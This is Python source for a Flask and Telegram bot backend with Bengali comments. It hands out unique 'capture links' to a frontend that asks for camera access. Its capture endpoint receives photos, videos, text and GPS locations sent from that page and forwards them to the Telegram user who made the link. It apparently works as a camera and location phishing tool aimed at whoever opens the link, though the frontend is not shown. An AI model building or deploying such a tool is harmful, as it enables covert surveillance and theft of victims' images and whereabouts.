import os
import uuid
import logging
import base64
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
from dotenv import load_dotenv
from io import BytesIO
import asyncio

load_dotenv()

# কনফিগারেশন
BOT_TOKEN = os.getenv('BOT_TOKEN')
PORT = int(os.getenv('PORT', 10000))
FRONTEND_URL = os.getenv('FRONTEND_URL', 'https://magenta-melomakarona-5a38d8.netlify.app/')
# Render স্বয়ংক্রিয়ভাবে এই URL দেয়
RENDER_URL = os.getenv('RENDER_EXTERNAL_URL', f'https://localhost:{PORT}')

# লগিং
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask অ্যাপ
app = Flask(__name__)
CORS(app)

# ইউজার সেশন স্টোর
user_sessions = {}

# টেলিগ্রাম অ্যাপ্লিকেশন (Webhook-এর জন্য)
telegram_application = None

# ================== টেলিগ্রাম বট হ্যান্ডলার ==================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /start কমান্ড - ইউনিক URL তৈরি করে """
    user_id = update.effective_user.id
    username = update.effective_user.username or 'User'
    
    session_id = str(uuid.uuid4())
    
    user_sessions[session_id] = {
        'telegram_user_id': user_id,
        'username': username,
        'created_at': datetime.now().isoformat(),
        'data_received': []
    }
    
    unique_url = f"{FRONTEND_URL}/?session={session_id}"
    
    await update.message.reply_text(
        f"🎯 হ্যালো @{username}!\n\n"
        f"আপনার পার্সোনাল ক্যাপচার লিংক:\n\n"
        f"{unique_url}\n\n"
        f"👉 এই লিংকে ক্লিক করুন এবং ক্যামেরা এক্সেস দিন\n"
        f"📸 আপনার ছবি ও তথ্য শুধু আপনার টেলিগ্রামে আসবে!"
    )
    logger.info(f"Start command sent to user {user_id}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /help কমান্ড """
    await update.message.reply_text(
        "/start - নতুন ক্যাপচার লিংক তৈরি করুন\n"
        "/help - এই সাহায্য বার্তা"
    )

# ================== API এন্ডপয়েন্ট ==================

@app.route('/')
def home():
    return jsonify({'status': 'Bot is running'})

@app.route('/health', methods=['GET'])
def health():
    """Render-এর হেলথ চেকের জন্য"""
    return jsonify({'status': 'healthy', 'users': len(user_sessions)}), 200

@app.route('/webhook', methods=['POST'])
def webhook():
    """টেলিগ্রাম থেকে Webhook রিকোয়েস্ট হ্যান্ডল করে"""
    if telegram_application:
        try:
            update = Update.de_json(request.get_json(force=True), telegram_application.bot)
            asyncio.run(telegram_application.process_update(update))
            return '', 200
        except Exception as e:
            logger.error(f"Webhook error: {e}")
            return '', 500
    return '', 200

@app.route('/api/validate/<session_id>', methods=['GET'])
def validate_session(session_id):
    if session_id in user_sessions:
        return jsonify({'valid': True})
    return jsonify({'valid': False}), 404

@app.route('/api/capture/<session_id>', methods=['POST'])
def capture_data(session_id):
    if session_id not in user_sessions:
        return jsonify({'error': 'Invalid session'}), 404
    
    session = user_sessions[session_id]
    data = request.json
    data_type = data.get('type')
    content = data.get('data')
    
    try:
        # টেক্সট মেসেজ পাঠানো
        if data_type == 'text':
            asyncio.run(send_text(session['telegram_user_id'], content))
        
        # ফটো পাঠানো
        elif data_type == 'photo':
            img_data = base64.b64decode(content['buffer'])
            asyncio.run(send_photo(session['telegram_user_id'], img_data, content.get('caption')))
        
        # ভিডিও পাঠানো
        elif data_type == 'video':
            video_data = base64.b64decode(content['buffer'])
            asyncio.run(send_video(session['telegram_user_id'], video_data, content.get('caption')))
        
        # লোকেশন পাঠানো
        elif data_type == 'location':
            asyncio.run(send_location(
                session['telegram_user_id'],
                content['latitude'],
                content['longitude']
            ))
        
        session['data_received'].append({'type': data_type, 'timestamp': datetime.now().isoformat()})
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"Capture error: {e}")
        return jsonify({'error': str(e)}), 500

# ================== টেলিগ্রাম হেল্পার ==================

async def send_text(chat_id, text):
    await telegram_application.bot.send_message(chat_id=chat_id, text=text)

async def send_photo(chat_id, photo_data, caption):
    photo_file = BytesIO(photo_data)
    photo_file.name = 'photo.jpg'
    await telegram_application.bot.send_photo(
        chat_id=chat_id, 
        photo=photo_file, 
        caption=caption or '📸 ক্যাপচার করা ছবি'
    )

async def send_video(chat_id, video_data, caption):
    video_file = BytesIO(video_data)
    video_file.name = 'video.webm'
    await telegram_application.bot.send_video(
        chat_id=chat_id, 
        video=video_file, 
        caption=caption or '🎥 ক্যাপচার করা ভিডিও'
    )

async def send_location(chat_id, lat, lon):
    await telegram_application.bot.send_location(
        chat_id=chat_id, 
        latitude=lat, 
        longitude=lon
    )

# ================== বট সেটআপ ==================

async def setup_webhook():
    """Webhook সেটআপ করে"""
    global telegram_application
    
    telegram_application = Application.builder().token(BOT_TOKEN).build()
    telegram_application.add_handler(CommandHandler("start", start_command))
    telegram_application.add_handler(CommandHandler("help", help_command))
    
    await telegram_application.initialize()
    
    # Webhook সেটআপ
    webhook_url = f"{RENDER_URL}/webhook"
    await telegram_application.bot.set_webhook(webhook_url)
    
    # Webhook ইনফো দেখানো
    webhook_info = await telegram_application.bot.get_webhook_info()
    logger.info(f"Webhook set to: {webhook_url}")
    logger.info(f"Webhook info: {webhook_info}")

# ================== মেইন ==================

if __name__ == '__main__':
    # Webhook সেটআপ
    asyncio.run(setup_webhook())
    logger.info(f"Bot started! Frontend URL: {FRONTEND_URL}")
    
    # Flask অ্যাপ চালান
    app.run(host='0.0.0.0', port=PORT, debug=False)
